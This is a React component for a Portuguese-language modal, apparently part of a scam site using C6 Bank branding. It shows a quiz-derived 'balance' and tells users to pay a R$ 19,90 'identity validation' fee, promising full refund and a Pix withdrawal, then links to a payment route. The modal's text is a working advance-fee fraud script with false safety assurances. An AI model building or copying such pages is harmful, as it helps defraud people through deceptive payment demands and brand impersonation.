import lottie from "lottie-web";
import { useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import Unlock from "../../assets/c6/unlock.json";
import { useAppContext } from "../../context/AppContext";

export function ModalUnlock() {
  const { isModalOpenUnlock, setIsModalOpenUnLock, quizScore } = useAppContext();
  const containerRef = useRef<HTMLDivElement | null>(null);
  const navigate = useNavigate();

  useEffect(() => {
    if (isModalOpenUnlock) {
      const animation = lottie.loadAnimation({
        container: containerRef.current!,
        renderer: "svg",
        loop: true,
        autoplay: true,
        animationData: Unlock,
      });

      return () => {
        animation.destroy();
      };
    }
  }, [isModalOpenUnlock]);

  const handleCloseModal = () => {
    setIsModalOpenUnLock(false); // Fecha o modal
  };

  return (
    <>
      {/* Overlay de fundo */}
      <div
        className={`fixed inset-0 bg-black bg-opacity-50 z-40 transition-opacity antialiased duration-300 ${isModalOpenUnlock ? "opacity-100 visible" : "opacity-0 invisible"
          }`}
        onClick={handleCloseModal}
      ></div>

      {/* Modal Drawer */}
      <section
        className={`fixed inset-y-0 right-0 bg-[#242424] text-white w-full sm:w-[400px] h-full shadow-lg transform transition-transform duration-500 z-50 ${isModalOpenUnlock ? "translate-x-0" : "translate-x-full"
          }`}
      >
        <div className="flex flex-col items-center h-full px-10 sm:px-20 mt-10">
          {/* Contêiner do Lottie */}
          <div ref={containerRef} className="w-[100px] h-[100px] mb-8" />

          {/* Título */}
          <strong className="text-[1.10em] font-c6text-bold mb-4 leading-6 text-center">
            DESBLOQUEAR SEU SALDO
          </strong>

          {/* Texto explicativo */}
          <p className="text-[0.80rem] font-c6text-regular text-gray-300 text-justify mb-6">
            <strong className="font-c6text-regular">
              <b className="text-[#ffcd2e] font-c6text-regular">IMPORTANTE ! {" "}</b>
            </strong>
            Para garantir a segurança e integridade do nosso sistema, precisamos confirmar que você é um usuário legítimo. Este é um passo essencial para proteger nossos usuários contra fraudes e manipulações.
            <br />
            <br />
            Fique tranquilo! Este valor será devolvido <b className="text-[#f4f4f4]">integralmente</b> e imediatamente após a validação. Assim, você poderá realizar o saque do total desejado via Pix de forma rápida e segura.{" "}
            <strong>
              <b className="text-[#ffcd2e]">R$ 19,90</b>
            </strong>{" "}

            <br />
            <br />
            Este procedimento é simples, 100% seguro e garante que todos os usuários tenham uma experiência confiável e protegida em nossa plataforma.
            <br />
            <br />
            Valide sua identidade agora mesmo e desbloqueie seu saque em poucos instantes!
          </p>
          <button onClick={() => {
            handleCloseModal(); // Fecha o modal
            navigate("/resgate"); // Redireciona para a página GatewayPage
          }} className="bg-[#ffcd2e] text-black font-c6display-regular w-full rounded-md py-2">Liberar saldo <b>R$    {quizScore.toFixed(2).replace('.', ',')}</b> </button>
        </div>
      </section>
    </>
  );
}
